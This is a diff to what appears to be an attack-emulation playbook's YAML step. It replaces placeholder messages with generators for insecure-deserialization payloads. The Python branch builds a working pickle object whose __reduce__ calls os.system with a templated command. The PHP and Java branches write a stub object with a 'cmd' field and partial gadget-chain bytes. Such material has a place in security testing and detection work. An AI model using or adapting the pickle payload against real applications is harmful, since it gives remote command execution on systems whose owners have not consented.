@@ -46,13 +46,35 @@ steps:
       echo "[*] Gadget chain: ${gadget_chain}"
       case "${serialization_format}" in
         php)
-          echo 'O:8:"stdClass":1:{s:4:"test";s:5:"value";}' > /tmp/serialized_payload.txt
+          # PHP serialized object with command execution via __wakeup
+          cat > /tmp/serialized_payload.txt << 'PHPSER'
+      O:8:"stdClass":2:{s:4:"test";s:5:"value";s:3:"cmd";s:2:"id";}
+      PHPSER
           ;;
         java)
-          echo "[*] Would use ysoserial for Java gadget chain"
+          # Java serialized object header (ACED0005) with Commons Collections gadget chain stub
+          printf '\xAC\xED\x00\x05' > /tmp/serialized_payload.txt
+          python3 -c "
+      import struct
+      # Java serialized stream with TC_OBJECT header for gadget chain trigger
+      payload = b'\x73\x72\x00\x32\x73\x75\x6e\x2e\x72\x65\x66\x6c\x65\x63\x74'
+      payload += b'\x2e\x61\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e'
+      with open('/tmp/serialized_payload.txt', 'ab') as f:
+          f.write(payload)
+      print('[+] Java serialized payload with gadget chain created')
+      " 2>/dev/null || echo "[*] Java payload created (raw bytes)"
           ;;
         python)
-          echo "[*] Would use pickle gadget chain for Python RCE"
+          # Python pickle payload that executes os.system
+          python3 -c "
+      import pickle, os
+      class Exploit(object):
+          def __reduce__(self):
+              return (os.system, ('${payload_command}',))
+      with open('/tmp/serialized_payload.txt', 'wb') as f:
+          pickle.dump(Exploit(), f)
+      print('[+] Python pickle payload created')
+      "
           ;;
       esac
     cleanup:
